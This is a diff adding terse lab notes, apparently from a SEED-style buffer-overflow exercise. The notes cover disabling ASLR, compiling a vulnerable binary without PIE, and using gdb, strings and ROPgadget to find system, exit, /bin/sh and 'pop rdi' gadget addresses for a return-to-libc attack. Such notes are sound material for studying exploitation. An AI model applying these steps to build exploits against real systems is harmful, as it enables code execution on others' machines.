@@ -1,0 +1,38 @@
+su
+sysctl -w kernel.randomize_va_space=0
+cat /proc/sys/kernel/randomize_va_space
+
+gcc -g -fstack-protector -no-pie vulnerable.c -o vulnerable
+checksec --file=./vulnerable
+
+gdb vulnerable -q
+
+b main
+r
+disassemble main
+disassemble secret
+p system
+p exit
+info proc mappings
+strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+
+ROPgadget --binary ./libc.so.6 | grep "pop rdi"
+
+0x000000000002840e : pop rdi ; pop rbp ; ret
+0x0000000000028215 : pop rdi ; ret
+
+0x7ffff7e26ab0 => system
+0x7ffff7e18b30 => exit
+0x7ffff7dd9000 => base_sh
+197e34 => strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+
+
+(gdb) b gets
+Breakpoint 1 at 0x401060
+(gdb) r
+Starting program: /home/seed/canary/vulnerable 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, _IO_gets (buf=0x7fffffffe3c0 "") at ./libio/iogets.c:37
+warning: 37     ./libio/iogets.c: No such file or directory
